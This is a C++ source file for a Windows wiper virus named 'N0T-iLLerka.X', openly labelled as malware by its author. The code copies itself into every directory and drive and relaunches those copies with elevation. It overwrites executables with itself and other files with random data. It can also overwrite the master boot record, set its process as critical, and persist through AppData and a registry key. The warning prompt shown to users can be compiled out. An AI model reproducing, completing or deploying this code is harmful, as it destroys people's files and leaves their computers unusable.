/*-------------------------------------------------------------------------------------------*\
 |  _______  _________________     __ ___     ___                 __               ____  ___ |
 |  \      \ \   _  \__   ___/    |__|   |   |   |    ___________|  | ______       \   \/  / |
 |  /   |   \/  /_\  \|   | ______|  |   |   |   |  _/ __ \_  __ \  |/ \__  \       \     /  |
 | /    |    \  \_/   \   |/_____/|  |   |___|   |__\  ___/|  | \/    < / __ \_     /     \  |
 | \____|__  /\_____  /___|       |__|______ \______ \___  >__|  |__|_ (____  / /\ /___/\  \ |
 |         \/       \/                      \/      \/   \/           \/    \/  \/       \_/ |
 +----------------------------------------------------------------+--------------------------/
 | N0T-iLLerka.X [your File Killer]      [Virus.Win32.C Type: .X] |
 | by Lima X [L4X] / [G-C-E-R] � 2k19            [dev-VER: 0.4.9] |
\*----------------------------------------------------------------*/

#include "../HeaderFiles/N0TiLLerka.h"

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLine, INT nCmdShow) {
	INT nArgs;
	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);

	WCHAR szMfn[MAX_PATH];
	GetModuleFileName(NULL, szMfn, MAX_PATH);

	// Check if ArgumentList was Created, if not: Exit Malware
	if (!szArglist) {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't parse Commandline", L"CommandLineToArgvW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG

		ExitProcess(EXIT_FAILURE);
	}

	if (nArgs > 1) {
		if (!lstrcmp(szArglist[1], L"/exec")) {
// ######## Start of /exec ######## Malware Payload execution #######################################################################################
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Executing with Argument: /exec", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif // DEBUG_MSG

			// Check if /host Mutex exist, if not: Exit Malware
			if (!CheckMutex(HOST_MUTEX)) {
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}

			// BETA
			WCHAR szCd[MAX_PATH];
			GetCurrentDirectory(MAX_PATH, szCd);
			std::vector<std::wstring> vszDir, vszFile;
			if (DirectoryIterator(szCd, L"*", vszDir, vszFile)) {
				// DirectoryInfector
				std::wstring szNfn;
				for (std::wstring i : vszDir) {
					szNfn = i + L"\\" + RandomStringGenerator(MIN_RSLEN + (fnCryptGenRandomNumber() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
					CopyFile(szMfn, szNfn.c_str(), FALSE);
					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
				}
				
				// FileCorruptor
				LARGE_INTEGER liFs;
				DWORD dwNOBW;
				
				for (std::wstring i : vszFile) {
					HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
					if (hFile) {
						if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
#ifdef DEBUG_MSG
									WCHAR szDest[800];
									StringCchPrintf(szDest, 800, L"Current Module: %s\nFile to overwrite: %s\nErrorCode: %d", szMfn, i.c_str(), GetLastError());
									MessageBox(NULL, szDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								}
							}
						} else if (GetFileSizeEx(hFile, &liFs)) {
							if (liFs.QuadPart <= MAX_BUFFER_SIZE) {
								PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];
								
								if (BCryptGenRandom(NULL, (PBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
#ifdef DEBUG_MSG
									MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
									ZeroMemory(pszRdDs, liFs.QuadPart);
								}
															
								if (!WriteFile(hFile, pszRdDs, liFs.QuadPart, &dwNOBW, NULL)) {
#ifdef DEBUG_MSG
									MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								}

								delete[] pszRdDs;
							} else {
								PWCHAR pszRdCs = new WCHAR[MAX_BUFFER_SIZE];
								
								if (BCryptGenRandom(NULL, (PBYTE)pszRdCs, MAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
#ifdef DEBUG_MSG
									MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
									ZeroMemory(pszRdCs, MAX_BUFFER_SIZE);
								}

								if (!WriteFile(hFile, pszRdCs, MAX_BUFFER_SIZE, &dwNOBW, NULL)) {
#ifdef DEBUG_MSG
									MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								}

								delete[] pszRdCs;
							}
						}

						CloseHandle(hFile);
					} else {
#ifdef DEBUG_MSG
						MessageBox(NULL, L"Couldn't open existing File", MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
					}
				}
			}

			LocalFree(szArglist);
			ExitProcess(EXIT_SUCCESS);
// ######## End of /exec ############################################################################################################################
		} else if (!lstrcmp(szArglist[1], L"/host")) {
// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
			if (!fnIsUserAdmin()) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Process isn't Administrator", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}

			if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif // DEBUG_MSG
			}

#ifdef DEBUG_MSG
			if (nArgs > 2) {
				if (!lstrcmp(szArglist[2], L"/init")) {
					MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
				} else {
					MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
				}
			}
#endif // DEBUG_MSG

#ifndef DISABLE_MUTEX
			// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
			if (CheckMutex(HOST_MUTEX)) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif // DEBUG_MSG
				
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
			else {
				// Create /host Mutex for /exec operation
				HANDLE hMutex = CreateMutex(NULL, TRUE, HOST_MUTEX);
				if (!hMutex) {
#ifdef DEBUG_MSG
					MessageBox(NULL, L"Couldn't create /host Mutex", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
					LocalFree(szArglist);
					ExitProcess(EXIT_FAILURE);
				}
			}
#endif // !DISABLE_MUTEX


#ifndef DISABLE_SEMAPHORE
			// Create /host Semaphore for /exec operation
			HANDLE hSemaphore = CreateSemaphore(NULL, MAX_SMPO, MAX_SMPO, HOST_SEMAPHORE);
			if (!hSemaphore) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Couldn't create /host Semaphore", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
#endif // !DISABLE_SEMAPHORE

#ifndef DISABLE_NT_FUNCTIONS
			// Set Process as critical
			if (ImportNTDLLFunctions()) {
				if (NTSetProcessIsCritical(TRUE)) {
#ifdef DEBUG_MSG
					MessageBox(NULL, L"HostProcess is now Critical", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif // DEBUG_MSG
				}
			}
#endif // !DISABLE_NT_FUNCTIONS

			if (nArgs > 2) {
				// Initialize the Malware
				if (!lstrcmp(szArglist[2], L"/init")) {
#ifdef KILL_MBR
					fnOverwriteMBR();
#endif // KILL_MBR
					
					// Enumerate Drives
					std::vector<std::wstring> vszDrives;
					std::wstring szNfn;
					if (DriveEnumerator(vszDrives)) {
						// Copy & Execute Malware in all enumerated Drives
						for (std::wstring i : vszDrives) {
							szNfn = i + RandomStringGenerator(MIN_RSLEN + (fnCryptGenRandomNumber() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";

							if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
								ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
							} else {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
							}
						}
					} else {
						// If DriveEnumerator fails, try C:\ Directory
						szNfn = L"C:\\" + RandomStringGenerator(MIN_RSLEN + (fnCryptGenRandomNumber() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";

						if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
							ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
						} else {
#ifdef DEBUG_MSG
							MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
						}
					}

					// Create Registry Key
					if (!CreateRegistryKey(REGISTRY_KEY, REGISTRY_SUBKEY, REG_DWORD, REGISTRY_VALUE)) {
						// TODO: add nothing at all because I don't know what I should do here.
						//		 If the functions fails well then it will fail.
						//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
						//		 if the User manually executes the Malware after the initial Initialization
					}
				}
			}


			// Deadlock
			LocalFree(szArglist);
			for (;;) {
				Sleep(INFINITE);
			}
		} // ######## End of /host ##################################################################################################################
	}

	// If no Arguments were passed ...

	// Create Random String to Copy host into AppData if necessary
	PWSTR pszShkfp;
	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszShkfp);
	std::wstring szAdpn = std::wstring(pszShkfp) + L"\\" + RandomStringGenerator(MIN_RSLEN + (fnCryptGenRandomNumber() % ((MAX_RSLEN - MIN_RSLEN) + 1)));
	std::wstring szAdfn = szAdpn + L"\\" + RandomStringGenerator(16) + L".exe";
	CoTaskMemFree(pszShkfp);

	// Check Registry Key/Type/Value
	if (CheckRegistryKey(REGISTRY_KEY, REGISTRY_SUBKEY, REG_DWORD, REGISTRY_VALUE)) {
		if (!fnIsUserAdmin()) {
			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);

			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		if (!CheckMutex(HOST_MUTEX)) {
			if (CopyFileToAppData(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
			} else {
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		}

		INT nKillswitch = 0;
		while (!CheckMutex(HOST_MUTEX)) {
			if (nKillswitch == 50) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Malware Host failed to launch", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}

			nKillswitch++;
			Sleep(100);
		}

		ShellExecute(NULL, L"runas", szMfn, L"/exec", NULL, SW_SHOWDEFAULT);
	} else {
#ifndef DISABLE_WARNING
		// Warn User about the execution of the Malware
		if (MessageBox(NULL, L"The Software you're trying to execute is considered Malware !\n\n"
			L"Running this Malware will result in your Computer being unusable "
			L"and your Files being irreparably damaged/destroyed.\n\n"
			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
			L"If you know what you're doing press YES to continue.\n\n"
			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
#endif // !DISABLE_WARNING
			if (CopyFileToAppData(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
				ShellExecute(NULL, L"runas",  szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
			} else {
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
#ifndef DISABLE_WARNING
		}
#endif // !DISABLE_WARNING
	}

	LocalFree(szArglist);
	return EXIT_SUCCESS;
}